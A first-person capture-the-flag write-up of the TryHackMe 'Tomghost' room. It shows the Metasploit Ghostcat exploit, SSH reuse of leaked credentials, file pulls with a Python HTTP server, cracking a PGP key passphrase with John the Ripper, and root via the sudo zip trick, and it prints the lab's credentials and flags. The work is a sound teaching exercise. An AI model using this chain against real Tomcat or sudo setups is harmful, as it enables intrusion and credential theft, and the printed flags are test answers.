https://tryhackme.com/room/tomghost

Vulnerable Machine IP: 10.81.170.211
Attack Machine IP: 192.168.136.34

Let's begin with a simple Nmap scan to identify all open ports (quick SYN Scan, option -T4 used to increase speed)
`└─$ nmap -sS 10.81.170.211 -p- -T4`

From the port range 0-65535 only four ports were discovered: 22, 53, 8009, 8080.
Let's enumerate them further:
`└─$ nmap -sC -sV -O 10.81.170.211 -p22,53,8009,8080`

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30

Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Note: less interesting lines have been cut for brevity.

As we can see, we're dealing with Apache Tomcat 9.0.30. Since the room is called '*Tomghost*' with can deduce, that it's based on **Tom**cat vulnerability.
A quick search in Google yields an exploit that might interest us:
`Search: apache tomcat 9.0.30 vulnerability`
`Found: Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)`
>It's difficult to search for this purely through searchsploit or exploit-db, because it doesn't contain Tomcat version in the title.

If we notice '(Metasploit)' in the title, we should already know `msfconsole` is the next command we will execute in our terminal. 
After Metasploit has been launched, enter:
`msf > search ghostcat`
Only one result is found: 
```
auxiliary/admin/http/tomcat_ghostcat, disclosed: 2020-02-20

> use 0
```
Note: we specified '*use 0*', because that's the id (#) of the found vulnerabilities from the list (left side, next to the name)

Let's try to run it! But first, we need to set up options:
`show options`

```
Name      Current Setting   Required  Description
----      ---------------   --------  -----------
FILENAME  /WEB-INF/web.xml  yes       File name
RHOSTS                      yes       The target host(s)
RPORT     8009              yes       The Apache JServ Protocol
```

From what we've seen with Nmap, RPORT is configured properly (there was Apache JServ on port 8009). We only need to enter IP of target host.
```python
msf auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.81.170.211
RHOSTS => 10.81.170.211
```

And now just enter command: `run` (or `exploit` if you want to feel like a hacker ;)
The exploit should come through. It shows user credentials!
They are inserted in html code shown from the website:
```
skyfuck:8730281lkjlkjdqlksalks
```

I've tried to access Apache Tomcat on port 8080, but it didn't seem to work. 
But there was also OpenSSH available on port 22! Maybe that'll work?
```
└─$ ssh skyfuck@10.81.170.211
skyfuck@10.81.170.211's password: 
skyfuck@ubuntu:~$ whoami
skyfuck
```
Yes! Worked perfectly.

Let's look around.
In the skyfuck's user directory there are two files that caught my attention: *credential.pgp* and *tryhackme.asc*. 
At this point I tried to go for low hanging fruit and checked if /etc/shadow was accessible, or which commands can I use with sudo. 

```
cat: /etc/shadow: Permission denied
```
>"I'm sorry Dave, I'm afraid I can't do that."

```
skyfuck@ubuntu:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
skyfuck@ubuntu:~$ sudo -l
[sudo] password for skyfuck: 
Sorry, user skyfuck may not run sudo on ubuntu.
```
It seems we need to use .pgp and .asc files somehow.

Another search shows that .pgp is a file that is encrypted with PGP standard (that means "Pretty Good Privacy").
If we use `cat` command on `tryhackme.asc`, we can see it's a private key for the PGP file..

We need to import the secret key (.asc), and then use it for encrypted file (.pgp):
```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: key C6707170: secret key imported
...
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 
You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
Enter passphrase: 
```
D'oh! We don't have the passphrase!
That's where cracking passwords come to play.
There are no password crackers on the machine we are attacking. [ :( ]
They need to be transferred to our attack machine. I'm going to use `python3`, because it's available on the target:
```
skyfuck@ubuntu:~$ python3 --version
Python 3.5.2
skyfuck@ubuntu:~$ python3 -m http.server 5217
Serving HTTP on 0.0.0.0 port 5217 ...
```
On attack machine:
```
└─$ wget http://10.81.170.211:5217/tryhackme.asc 
... ‘tryhackme.asc’ saved 

└─$ wget http://10.81.170.211:5217/credential.pgp
... ‘credential.pgp’ saved
```

Now we have the files on our attack machine. 
Johntheripper, software known for cracking hashes has a module `gpg2john` that converts a private key in pure form into something that JTR can crack.

Here's the catch: We actually need to crack .asc key, not the pgp!

```
└─$ gpg2john tryhackme.asc > key.john 

└─$ cat key.john                   
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89...(redacted for brevity)
```

After checking the format (`john --list=formats | grep gpg)` we can proceed with the bruteforce:
```
└─$ john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt  key.john
```
Remember to specify the format and wordlist for bruteforce. Without the `--format=gpg`, john tried to load tripcode instead of gpg in my case.

It went well! The passphrase is: `alexandru`
If you lost it between the lines, just use `john key.john --show`.

Now we go back to the target machine. Turn off python server and try to breach once again:
```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: key C6707170: already in secret keyring

skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 
...
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

And we're in! ...well still not root, but it's something ^^
In the home of Merlin, we can see our first flag: `THM{GhostCat_1s_so_cr4sy}

It's worth mentioning this flag is also accessible from `skyfuck` account, so we haven't gained much at this point (but it's something!).

Common privilege escalation methods are worth checking once again, so I tried:
```
merlin@ubuntu:~$ sudo -l
```
and we see...
```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
First try! (I'm not kidding ;) That means we can zip (compress) pretty much any file in the filesystem and then do whatever we want with it (for example, change read access permissions)!

So to check if we can actually use it with sudo:
```
merlin@ubuntu:~$ sudo /usr/bin/zip 
Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
Zip 3.0 (July 5th 2008). Usage:
...
```
>Because we want to break into root account, we will forget for a while that zip could also be used to instantly retrieve root.txt flag ;)

GTFOBins helps here. At first I went into the rabbit hole of password cracking using passwd and shadow, but came to conclusion that it'll take a while to crack sha512crypt password. 

GTFOBins says that all we need to do is execute one command and we'll be root!
```
merlin@ubuntu:~$ sudo /usr/bin/zip /tmp/tempfile /etc/hosts -T -TT '/bin/sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
#
```
Boom! Pwned. 

Where is the flag?
```
# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{Z1P_1S_FAKE}
# 
```
Finished! 
That concludes this challenge. Thanks for reading and see you in the next one!

Sources:
https://www.exploit-db.com/exploits/49039
https://www.goanywhere.com/blog/what-is-a-pgp-file
https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key
https://github.com/openwall/john/blob/bleeding-jumbo/src/gpg2john.c
https://www.kali.org/tools/john/
https://gtfobins.github.io/gtfobins/zip/